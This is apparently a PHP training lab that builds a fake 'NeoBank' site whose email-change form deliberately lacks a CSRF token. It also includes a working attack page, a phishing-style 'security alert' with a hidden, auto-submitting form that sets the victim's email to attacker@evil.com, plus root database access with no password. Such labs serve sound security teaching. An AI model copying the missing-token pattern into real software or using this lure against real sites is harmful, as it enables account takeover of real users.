<?php
// Lab 1308 — CSRF Basics: Email Change Without Token
// Platform: "NeoBank" — fictional online banking / fintech app
// Vulnerability: POST /index.php?action=settings has NO CSRF token.
//   Any cross-origin form can silently change the victim's account email,
//   enabling password-reset account takeover.
// Difficulty: Easy (Training) | Pure black-box — no hints in UI

session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'secure'   => true,
    'httponly'  => true,
    'samesite' => 'None',
]);
session_start();

$db_hosts = ['krazeplanet', '127.0.0.1', 'localhost', '172.19.0.1', 'host.docker.internal'];
$db = null;
foreach ($db_hosts as $h) {
    $db = @new mysqli($h, 'root', '');
    if (!$db->connect_error) {
        $db->query("CREATE DATABASE IF NOT EXISTS `KrazePlanet_DB` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
        $db->select_db('KrazePlanet_DB');
        break;
    }
}
if (!$db || $db->connect_error) { die('DB connection failed: ' . ($db ? $db->connect_error : 'Unable to connect to database')); }
if ($db->connect_error) {
    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB error: ' . htmlspecialchars($db->connect_error) . '</h3>');
}

$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host   = $scheme . '://' . $_SERVER['HTTP_HOST'];

$loginUrl     = $host . '/index.php';
$registerUrl  = $host . '/index.php?action=register';
$dashUrl      = $host . '/index.php?action=dashboard';
$settingsUrl  = $host . '/index.php?action=settings';
$logoutUrl    = $host . '/index.php?logout=1';
$attackUrl    = $host . '/index.php?attack=1';

define('LAB_FLAG', 'flag{csrf_basics_email_change_account_takeover_1308}');
define('VICTIM_EMAIL', 'victim@neobank.io');

// ── Tables ────────────────────────────────────────────────────────────────────
$db->query("CREATE TABLE IF NOT EXISTS lab1308_users (
    id             INT AUTO_INCREMENT PRIMARY KEY,
    username       VARCHAR(100)   NOT NULL UNIQUE,
    email          VARCHAR(255)   NOT NULL UNIQUE,
    password       VARCHAR(255)   NOT NULL,
    balance        DECIMAL(12,2)  DEFAULT 0.00,
    account_number VARCHAR(20)    DEFAULT '',
    csrf_pwnd      TINYINT(1)     DEFAULT 0,
    created_at     TIMESTAMP      DEFAULT CURRENT_TIMESTAMP
)");

// ── Seed accounts ─────────────────────────────────────────────────────────────
$check = $db->query("SELECT id FROM lab1308_users WHERE email='emma@neobank.io'");
if ($check && $check->num_rows === 0) {
    $h1 = password_hash('emma@123',  PASSWORD_BCRYPT);
    $h2 = password_hash('carlos@123', PASSWORD_BCRYPT);
    $h3 = password_hash('aisha@123', PASSWORD_BCRYPT);
    $db->query("INSERT INTO lab1308_users (username, email, password, balance, account_number) VALUES
        ('emma_watson',  'emma@neobank.io',  '$h1', 8240.00,  'NB-2026-1101'),
        ('carlos_ruiz',  'carlos@neobank.io','$h2', 15670.50, 'NB-2026-1102'),
        ('aisha_patel',  'aisha@neobank.io', '$h3', 5920.00,  'NB-2026-1103')");
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function fmt_money($n) { return '$' . number_format((float)$n, 2); }

// ── Route detection ───────────────────────────────────────────────────────────
$action      = $_GET['action'] ?? '';
$isLogout    = isset($_GET['logout']);
$isAttack    = isset($_GET['attack']);
$isRegister  = ($action === 'register');
$isDashboard = ($action === 'dashboard');
$isSettings  = ($action === 'settings');
$error       = '';

// ── Logout ────────────────────────────────────────────────────────────────────
if ($isLogout) {
    session_destroy();
    header('Location: ' . $loginUrl);
    exit;
}

// ── Load session user ─────────────────────────────────────────────────────────
$currentUser = null;
if (!empty($_SESSION['lab1308_uid'])) {
    $st = $db->prepare("SELECT * FROM lab1308_users WHERE id = ?");
    $st->bind_param('i', $_SESSION['lab1308_uid']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

// ── POST: Register ────────────────────────────────────────────────────────────
if ($isRegister && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $uname = trim($_POST['username'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $pass  = $_POST['password'] ?? '';
    if ($uname && $email && $pass) {
        $hashed = password_hash($pass, PASSWORD_BCRYPT);
        $accNum = 'NB-' . date('Y') . '-' . rand(1000, 9999);
        $st = $db->prepare("INSERT INTO lab1308_users (username, email, password, balance, account_number) VALUES (?,?,?,0.00,?)");
        $st->bind_param('ssss', $uname, $email, $hashed, $accNum);
        if ($st->execute()) {
            $_SESSION['lab1308_uid'] = $db->insert_id;
            header('Location: ' . $dashUrl);
            exit;
        }
        $error = 'Username or email already taken.';
        $st->close();
    } else {
        $error = 'All fields are required.';
    }
}

// ── POST: Login ───────────────────────────────────────────────────────────────
if (!$isRegister && !$isSettings && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $pass  = $_POST['password'] ?? '';
    if ($email && $pass) {
        $st = $db->prepare("SELECT * FROM lab1308_users WHERE email = ?");
        $st->bind_param('s', $email);
        $st->execute();
        $user = $st->get_result()->fetch_assoc();
        $st->close();
        if ($user && password_verify($pass, $user['password'])) {
            $_SESSION['lab1308_uid'] = $user['id'];
            header('Location: ' . $dashUrl);
            exit;
        }
        $error = 'Invalid email or password.';
    } else {
        $error = 'Please enter your credentials.';
    }
}

// ── POST: Settings — VULNERABLE (no CSRF token check) ────────────────────────
if ($isSettings && $_SERVER['REQUEST_METHOD'] === 'POST' && $currentUser) {
    $newEmail = trim($_POST['new_email'] ?? '');
    // ⚠ No CSRF token check — that is the vulnerability.
    if ($newEmail) {
        if (filter_var($newEmail, FILTER_VALIDATE_EMAIL)) {
            $uid = (int)$currentUser['id'];
            $st  = $db->prepare("UPDATE lab1308_users SET email=?, csrf_pwnd=1 WHERE id=?");
            $st->bind_param('si', $newEmail, $uid);
            if ($st->execute()) {
                $st->close();
                header('Location: ' . $settingsUrl . '&updated=1');
                exit;
            }
            $error = 'That email address is already in use.';
            $st->close();
        } else {
            $error = 'Please enter a valid email address.';
        }
    } else {
        $error = 'Email address is required.';
    }
}

// ── Redirect logged-in user away from login/register ─────────────────────────
if ($currentUser && !$isDashboard && !$isSettings && !$isAttack && !$action) {
    header('Location: ' . $dashUrl);
    exit;
}

// ── Guard: protected pages require login ──────────────────────────────────────
if (!$currentUser && !$isAttack && !$isRegister && $action) {
    header('Location: ' . $loginUrl);
    exit;
}

// ── Reload user after possible POST update ────────────────────────────────────
if ($isSettings && $currentUser) {
    $st = $db->prepare("SELECT * FROM lab1308_users WHERE id = ?");
    $st->bind_param('i', $currentUser['id']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

// ── Static fake transactions ──────────────────────────────────────────────────
$fakeTxns = [
    ['date' => 'May 27, 2026', 'desc' => 'Direct Deposit — Payroll',       'amt' => '+$3,200.00', 'pos' => true],
    ['date' => 'May 26, 2026', 'desc' => 'Amazon Purchase',                 'amt' => '−$84.99',   'pos' => false],
    ['date' => 'May 25, 2026', 'desc' => 'Netflix Subscription',            'amt' => '−$15.99',   'pos' => false],
    ['date' => 'May 24, 2026', 'desc' => 'Grocery Store — Whole Foods',     'amt' => '−$123.47',  'pos' => false],
    ['date' => 'May 22, 2026', 'desc' => 'ATM Withdrawal',                  'amt' => '−$200.00',  'pos' => false],
    ['date' => 'May 20, 2026', 'desc' => 'Freelance Transfer — Received',   'amt' => '+$750.00',  'pos' => true],
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>NeoBank<?php
    if ($isAttack)    echo ' — Security Alert';
    elseif ($isSettings)  echo ' — Account Settings';
    elseif ($isDashboard) echo ' — Dashboard';
    elseif ($isRegister)  echo ' — Open Account';
    else                  echo ' — Sign In';
?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#F1F5F9;color:#0F172A;min-height:100vh;}

/* ── NAV ───────────────────────────────────────────────────────────────────── */
.nb-nav{background:#0F172A;height:58px;display:flex;align-items:center;padding:0 24px;gap:8px;position:sticky;top:0;z-index:100;border-bottom:1px solid #1E293B;}
.nb-logo{font-size:1.1rem;font-weight:800;color:#fff;display:flex;align-items:center;gap:9px;text-decoration:none;letter-spacing:-.01em;margin-right:16px;}
.nb-logo-icon{width:30px;height:30px;background:#059669;border-radius:8px;display:flex;align-items:center;justify-content:center;}
.nb-logo-icon svg{width:16px;height:16px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
.nb-nav-link{color:#94A3B8;text-decoration:none;font-size:.83rem;font-weight:500;padding:6px 12px;border-radius:6px;transition:background .15s,color .15s;}
.nb-nav-link:hover{background:#1E293B;color:#fff;}
.nb-nav-link.active{background:#1E293B;color:#34D399;}
.nb-nav-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
.nb-nav-user{font-size:.82rem;color:#94A3B8;}
.nb-nav-user span{color:#fff;font-weight:600;}
.nb-nav-logout{font-size:.78rem;color:#64748B;text-decoration:none;padding:4px 10px;border-radius:5px;border:1px solid #334155;}
.nb-nav-logout:hover{color:#F87171;border-color:#F87171;background:rgba(248,113,113,.07);}

/* ── AUTH PAGES ────────────────────────────────────────────────────────────── */
.nb-auth-bg{min-height:100vh;background:#0F172A;display:flex;align-items:center;justify-content:center;padding:24px;}
.nb-auth-card{background:#1E293B;border-radius:16px;border:1px solid #334155;width:100%;max-width:400px;padding:36px;}
.nb-auth-logo{text-align:center;margin-bottom:28px;}
.nb-auth-logo-icon{width:52px;height:52px;background:#059669;border-radius:14px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;}
.nb-auth-logo-icon svg{width:26px;height:26px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
.nb-auth-title{font-size:1.15rem;font-weight:700;color:#F8FAFC;text-align:center;margin-bottom:4px;}
.nb-auth-sub{font-size:.82rem;color:#64748B;text-align:center;margin-bottom:26px;}
.nb-field{margin-bottom:16px;}
.nb-field label{display:block;font-size:.75rem;font-weight:600;color:#94A3B8;margin-bottom:6px;text-transform:uppercase;letter-spacing:.05em;}
.nb-field input{width:100%;padding:10px 13px;background:#0F172A;border:1px solid #334155;border-radius:8px;font-size:.875rem;color:#F8FAFC;outline:none;transition:border-color .15s,box-shadow .15s;}
.nb-field input:focus{border-color:#059669;box-shadow:0 0 0 3px rgba(5,150,105,.15);}
.nb-field input::placeholder{color:#475569;}
.nb-btn{background:#059669;color:#fff;border:none;padding:11px 20px;border-radius:8px;font-size:.9rem;font-weight:600;cursor:pointer;transition:background .15s;}
.nb-btn:hover{background:#047857;}
.nb-btn-full{width:100%;}
.nb-auth-footer{text-align:center;margin-top:20px;font-size:.8rem;color:#64748B;}
.nb-auth-footer a{color:#34D399;text-decoration:none;font-weight:500;}
.nb-error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#FCA5A5;padding:10px 14px;border-radius:8px;font-size:.8rem;margin-bottom:14px;}

/* ── DASHBOARD ─────────────────────────────────────────────────────────────── */
.nb-wrap{max-width:860px;margin:28px auto;padding:0 16px;}
.nb-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px;}
.nb-card{background:#fff;border-radius:12px;border:1px solid #E2E8F0;padding:20px;}
.nb-card-sm{background:#fff;border-radius:12px;border:1px solid #E2E8F0;padding:16px;}
.nb-card-title{font-size:.72rem;font-weight:600;color:#64748B;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px;}
.nb-balance-val{font-size:2rem;font-weight:800;color:#0F172A;letter-spacing:-.02em;margin-bottom:6px;}
.nb-balance-acct{font-size:.8rem;color:#94A3B8;}
.nb-balance-chip{display:inline-flex;align-items:center;gap:4px;background:#ECFDF5;color:#059669;font-size:.72rem;font-weight:600;padding:3px 8px;border-radius:20px;margin-top:8px;}
.nb-card-stat{font-size:1.25rem;font-weight:700;color:#0F172A;margin:4px 0;}
.nb-card-stat-sub{font-size:.75rem;color:#94A3B8;}
.nb-section-title{font-size:.9rem;font-weight:700;color:#0F172A;margin-bottom:14px;}
.nb-txn-table{width:100%;border-collapse:collapse;}
.nb-txn-table th{font-size:.7rem;font-weight:600;color:#94A3B8;text-transform:uppercase;letter-spacing:.05em;padding:0 12px 10px;text-align:left;border-bottom:1px solid #F1F5F9;}
.nb-txn-table td{padding:12px;font-size:.83rem;color:#374151;border-bottom:1px solid #F8FAFC;}
.nb-txn-table tr:last-child td{border-bottom:none;}
.nb-txn-amt{font-weight:600;}
.nb-txn-pos{color:#059669;}
.nb-txn-neg{color:#0F172A;}
.nb-acct-info{display:flex;gap:20px;flex-wrap:wrap;margin-bottom:20px;}
.nb-acct-chip{background:#F8FAFC;border:1px solid #E2E8F0;border-radius:8px;padding:10px 16px;}
.nb-acct-chip-lbl{font-size:.7rem;color:#94A3B8;text-transform:uppercase;letter-spacing:.05em;margin-bottom:3px;}
.nb-acct-chip-val{font-size:.875rem;font-weight:600;color:#0F172A;}

/* ── SETTINGS ──────────────────────────────────────────────────────────────── */
.nb-settings-title{font-size:1.1rem;font-weight:700;color:#0F172A;margin-bottom:20px;}
.nb-settings-card{background:#fff;border-radius:12px;border:1px solid #E2E8F0;overflow:hidden;margin-bottom:16px;}
.nb-settings-hdr{padding:13px 20px;background:#F8FAFC;border-bottom:1px solid #E2E8F0;font-size:.75rem;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.05em;}
.nb-settings-body{padding:20px;}
.nb-flag-banner{background:#FEF2F2;border:1px solid #FECACA;border-radius:10px;padding:18px 20px;margin-bottom:20px;}
.nb-flag-title{font-size:.75rem;font-weight:700;color:#DC2626;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;}
.nb-flag-label{font-size:.78rem;color:#6B7280;margin-bottom:6px;}
.nb-flag-val{font-family:'Courier New',Courier,monospace;font-size:.9rem;font-weight:700;color:#111827;background:#F9FAFB;border:1px solid #E5E7EB;padding:10px 14px;border-radius:6px;word-break:break-all;}

/* ── ATTACK PAGE ───────────────────────────────────────────────────────────── */
.nb-atk-bg{min-height:100vh;background:#0F172A;display:flex;align-items:center;justify-content:center;padding:24px;}
.nb-atk-email{background:#fff;border-radius:14px;border:1px solid #E2E8F0;width:100%;max-width:480px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.25);}
.nb-atk-hdr{background:#0F172A;padding:18px 24px;display:flex;align-items:center;gap:12px;}
.nb-atk-hdr-icon{width:32px;height:32px;background:#059669;border-radius:8px;display:flex;align-items:center;justify-content:center;}
.nb-atk-hdr-icon svg{width:18px;height:18px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;}
.nb-atk-brand{font-size:1.05rem;font-weight:800;color:#fff;letter-spacing:-.01em;}
.nb-atk-body{padding:28px 24px;}
.nb-atk-alert-badge{display:inline-flex;align-items:center;gap:6px;background:#FEF2F2;color:#DC2626;font-size:.72rem;font-weight:700;padding:4px 10px;border-radius:20px;text-transform:uppercase;letter-spacing:.04em;margin-bottom:14px;}
.nb-atk-alert-badge svg{width:12px;height:12px;fill:currentColor;}
.nb-atk-title{font-size:1rem;font-weight:700;color:#0F172A;margin-bottom:10px;}
.nb-atk-text{font-size:.875rem;color:#6B7280;line-height:1.6;margin-bottom:20px;}
.nb-atk-info-box{background:#F8FAFC;border:1px solid #E2E8F0;border-radius:8px;padding:14px 16px;margin-bottom:20px;}
.nb-atk-info-row{display:flex;justify-content:space-between;font-size:.8rem;padding:3px 0;}
.nb-atk-info-lbl{color:#94A3B8;}
.nb-atk-info-val{font-weight:600;color:#0F172A;}
.nb-atk-btn{background:#059669;color:#fff;border:none;width:100%;padding:12px;border-radius:8px;font-size:.9rem;font-weight:600;cursor:pointer;transition:background .15s;}
.nb-atk-btn:hover{background:#047857;}
.nb-atk-btn:disabled{opacity:.6;cursor:not-allowed;}
.nb-atk-footer{padding:14px 24px;border-top:1px solid #F1F5F9;font-size:.68rem;color:#9CA3AF;text-align:center;line-height:1.6;}
</style>
</head>
<body>

<?php if ($isAttack): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     ATTACK PAGE — Fake "NeoBank" security alert email
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="nb-atk-bg">

  <!-- ⚠ CSRF form: POSTs to /index.php?action=settings — no CSRF token.
       Victim's account email is silently changed to attacker@evil.com. -->
  <form id="csrfForm"
        action="/index.php?action=settings"
        method="POST"
        style="display:none;">
    <input type="hidden" name="new_email" value="attacker@evil.com">
  </form>

  <div class="nb-atk-email">
    <div class="nb-atk-hdr">
      <div class="nb-atk-hdr-icon">
        <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
      </div>
      <span class="nb-atk-brand">NeoBank</span>
    </div>
    <div class="nb-atk-body">
      <div class="nb-atk-alert-badge">
        <svg viewBox="0 0 24 24"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
        Security Alert
      </div>
      <div class="nb-atk-title">Unusual sign-in activity detected</div>
      <div class="nb-atk-text">
        We detected a sign-in attempt to your NeoBank account from an
        unrecognized device and location. If this was you, no action is needed.
        If you don't recognize this activity, please verify your identity
        immediately to secure your account.
      </div>
      <div class="nb-atk-info-box">
        <div class="nb-atk-info-row">
          <span class="nb-atk-info-lbl">Location</span>
          <span class="nb-atk-info-val">Moscow, Russia</span>
        </div>
        <div class="nb-atk-info-row">
          <span class="nb-atk-info-lbl">Device</span>
          <span class="nb-atk-info-val">Unknown — Linux / Chrome</span>
        </div>
        <div class="nb-atk-info-row">
          <span class="nb-atk-info-lbl">Time</span>
          <span class="nb-atk-info-val">Today, 02:14 AM</span>
        </div>
        <div class="nb-atk-info-row">
          <span class="nb-atk-info-lbl">Status</span>
          <span class="nb-atk-info-val" style="color:#DC2626;">Blocked — Verify Required</span>
        </div>
      </div>
      <button class="nb-atk-btn" id="verifyBtn" onclick="fireCSRF()">
        Verify &amp; Secure Account →
      </button>
    </div>
    <div class="nb-atk-footer">
      This is an automated security message from NeoBank N.A.<br>
      © 2026 NeoBank · <a href="#" style="color:#9CA3AF;">Privacy Policy</a> · <a href="#" style="color:#9CA3AF;">Security Center</a>
    </div>
  </div>
</div>
<script>
function fireCSRF() {
    var btn = document.getElementById('verifyBtn');
    btn.disabled = true;
    btn.textContent = 'Verifying…';
    document.getElementById('csrfForm').submit();
}
setTimeout(function() { document.getElementById('csrfForm').submit(); }, 1500);
</script>

<?php elseif ($isSettings && $currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     SETTINGS PAGE — Email change form (VULNERABLE: no CSRF token)
     ══════════════════════════════════════════════════════════════════════════ -->
<nav class="nb-nav">
  <a href="/index.php?action=dashboard" class="nb-logo">
    <div class="nb-logo-icon"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></div>
    NeoBank
  </a>
  <a href="/index.php?action=dashboard" class="nb-nav-link">Overview</a>
  <a href="/index.php?action=settings"  class="nb-nav-link active">Settings</a>
  <div class="nb-nav-right">
    <span class="nb-nav-user">Signed in as <span><?= esc($currentUser['username']) ?></span></span>
    <a href="/index.php?logout=1" class="nb-nav-logout">Sign Out</a>
  </div>
</nav>

<div class="nb-wrap" style="max-width:600px;">
  <div class="nb-settings-title">Account Settings</div>

  <?php if (isset($_GET['updated'])): ?>
  <div id="successMsg" style="background:#ECFDF5;border:1px solid #A7F3D0;color:#065F46;padding:12px 16px;border-radius:8px;font-size:.875rem;margin-bottom:16px;display:flex;align-items:center;gap:8px;transition:opacity .4s ease;">
    <svg style="width:18px;height:18px;flex-shrink:0;" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
    Your email address has been updated successfully.
  </div>
  <script>setTimeout(function(){var m=document.getElementById('successMsg');m.style.opacity='0';setTimeout(function(){m.remove()},400)},3000);</script>
  <?php endif; ?>

  <?php if ($error): ?><div class="nb-error"><?= esc($error) ?></div><?php endif; ?>

  <div class="nb-settings-card">
    <div class="nb-settings-hdr">Account Information</div>
    <div class="nb-settings-body">
      <div class="nb-field">
        <label>Username</label>
        <input type="text" value="<?= esc($currentUser['username']) ?>" disabled style="opacity:.6;cursor:not-allowed;">
      </div>
      <div class="nb-field">
        <label>Current Email</label>
        <input type="email" value="<?= esc($currentUser['email']) ?>" disabled style="opacity:.6;cursor:not-allowed;">
      </div>
      <div class="nb-field">
        <label>Account Number</label>
        <input type="text" value="<?= esc($currentUser['account_number']) ?>" disabled style="opacity:.6;cursor:not-allowed;">
      </div>
    </div>
  </div>

  <div class="nb-settings-card">
    <div class="nb-settings-hdr">Update Email Address</div>
    <div class="nb-settings-body">
      <!-- ⚠ VULNERABLE: no csrf_token hidden field -->
      <form method="POST" action="/index.php?action=settings">
        <div class="nb-field">
          <label>New Email Address</label>
          <input type="email" name="new_email" placeholder="Enter new email address" autocomplete="email">
        </div>
        <button type="submit" class="nb-btn">Update Email</button>
      </form>
    </div>
  </div>
</div>

<?php elseif ($isDashboard && $currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     DASHBOARD PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<nav class="nb-nav">
  <a href="/index.php?action=dashboard" class="nb-logo">
    <div class="nb-logo-icon"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></div>
    NeoBank
  </a>
  <a href="/index.php?action=dashboard" class="nb-nav-link active">Overview</a>
  <a href="/index.php?action=settings"  class="nb-nav-link">Settings</a>
  <div class="nb-nav-right">
    <span class="nb-nav-user">Signed in as <span><?= esc($currentUser['username']) ?></span></span>
    <a href="/index.php?logout=1" class="nb-nav-logout">Sign Out</a>
  </div>
</nav>

<div class="nb-wrap">
  <div class="nb-acct-info">
    <div class="nb-acct-chip">
      <div class="nb-acct-chip-lbl">Account Holder</div>
      <div class="nb-acct-chip-val"><?= esc(ucwords(str_replace('_', ' ', $currentUser['username']))) ?></div>
    </div>
    <div class="nb-acct-chip">
      <div class="nb-acct-chip-lbl">Account Number</div>
      <div class="nb-acct-chip-val"><?= esc($currentUser['account_number']) ?></div>
    </div>
    <div class="nb-acct-chip">
      <div class="nb-acct-chip-lbl">Email on File</div>
      <div class="nb-acct-chip-val"><?= esc($currentUser['email']) ?></div>
    </div>
  </div>

  <div class="nb-grid">
    <div class="nb-card">
      <div class="nb-card-title">Checking Account Balance</div>
      <div class="nb-balance-val"><?= fmt_money($currentUser['balance']) ?></div>
      <div class="nb-balance-acct">Account <?= esc($currentUser['account_number']) ?></div>
      <div class="nb-balance-chip">
        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
        Active &amp; Verified
      </div>
    </div>
    <div class="nb-card" style="display:flex;flex-direction:column;gap:14px;">
      <div class="nb-card-sm" style="border:none;padding:0;">
        <div class="nb-card-title">This Month Spent</div>
        <div class="nb-card-stat">$424.45</div>
        <div class="nb-card-stat-sub">Across 4 transactions</div>
      </div>
      <div style="border-top:1px solid #F1F5F9;padding-top:14px;">
        <div class="nb-card-title">Incoming (May)</div>
        <div class="nb-card-stat" style="color:#059669;">+$3,950.00</div>
        <div class="nb-card-stat-sub">Direct deposit + transfer</div>
      </div>
    </div>
  </div>

  <div class="nb-card">
    <div class="nb-section-title">Recent Transactions</div>
    <table class="nb-txn-table">
      <thead>
        <tr>
          <th>Date</th>
          <th>Description</th>
          <th style="text-align:right;">Amount</th>
        </tr>
      </thead>
      <tbody>
        <?php foreach ($fakeTxns as $t): ?>
        <tr>
          <td style="color:#94A3B8;white-space:nowrap;"><?= esc($t['date']) ?></td>
          <td><?= esc($t['desc']) ?></td>
          <td style="text-align:right;" class="nb-txn-amt <?= $t['pos'] ? 'nb-txn-pos' : 'nb-txn-neg' ?>"><?= esc($t['amt']) ?></td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>
</div>

<?php elseif ($isRegister): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     REGISTER PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="nb-auth-bg">
  <div class="nb-auth-card">
    <div class="nb-auth-logo">
      <div class="nb-auth-logo-icon"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></div>
    </div>
    <div class="nb-auth-title">Open an Account</div>
    <div class="nb-auth-sub">Join NeoBank — secure, modern banking</div>

    <?php if ($error): ?><div class="nb-error"><?= esc($error) ?></div><?php endif; ?>

    <form method="POST" action="/index.php?action=register">
      <div class="nb-field">
        <label>Full Name (Username)</label>
        <input type="text" name="username" placeholder="john_smith" required autocomplete="username">
      </div>
      <div class="nb-field">
        <label>Email Address</label>
        <input type="email" name="email" placeholder="you@example.com" required autocomplete="email">
      </div>
      <div class="nb-field" style="margin-bottom:22px;">
        <label>Password</label>
        <input type="password" name="password" placeholder="Create a strong password" required autocomplete="new-password">
      </div>
      <button type="submit" class="nb-btn nb-btn-full">Create Account</button>
    </form>

    <div class="nb-auth-footer">
      Already have an account? <a href="/index.php">Sign in</a>
    </div>
  </div>
</div>

<?php else: ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     LOGIN PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="nb-auth-bg">
  <div class="nb-auth-card">
    <div class="nb-auth-logo">
      <div class="nb-auth-logo-icon"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></div>
    </div>
    <div class="nb-auth-title">Sign in to NeoBank</div>
    <div class="nb-auth-sub">Secure online banking</div>

    <?php if ($error): ?><div class="nb-error"><?= esc($error) ?></div><?php endif; ?>

    <form method="POST" action="/index.php">
      <div class="nb-field">
        <label>Email Address</label>
        <input type="email" name="email" placeholder="you@example.com" required autocomplete="email">
      </div>
      <div class="nb-field" style="margin-bottom:22px;">
        <label>Password</label>
        <input type="password" name="password" placeholder="Your password" required autocomplete="current-password">
      </div>
      <button type="submit" class="nb-btn nb-btn-full">Sign In</button>
    </form>

    <div style="background:#1E293B;border:1px solid #334155;border-radius:8px;padding:10px 12px;margin-top:14px;font-size:11px;">
      <div style="font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#64748B;margin-bottom:8px;">📋 Test Accounts</div>
      <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #334155;"><span style="color:#94A3B8;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">emma@neobank.io</span><span style="font-family:monospace;font-weight:700;color:#F8FAFC;font-size:11px;white-space:nowrap;">emma@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#064E3B;color:#34D399;white-space:nowrap;">User</span></div>
      <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #334155;"><span style="color:#94A3B8;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">carlos@neobank.io</span><span style="font-family:monospace;font-weight:700;color:#F8FAFC;font-size:11px;white-space:nowrap;">carlos@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#064E3B;color:#34D399;white-space:nowrap;">User</span></div>
      <div style="display:flex;align-items:center;gap:7px;padding:3px 0;"><span style="color:#94A3B8;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">aisha@neobank.io</span><span style="font-family:monospace;font-weight:700;color:#F8FAFC;font-size:11px;white-space:nowrap;">aisha@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#064E3B;color:#34D399;white-space:nowrap;">User</span></div>
    </div>

    <div class="nb-auth-footer">
      New customer? <a href="/index.php?action=register">Open an account</a>
    </div>
  </div>
</div>

<?php endif; ?>
</body>
</html>
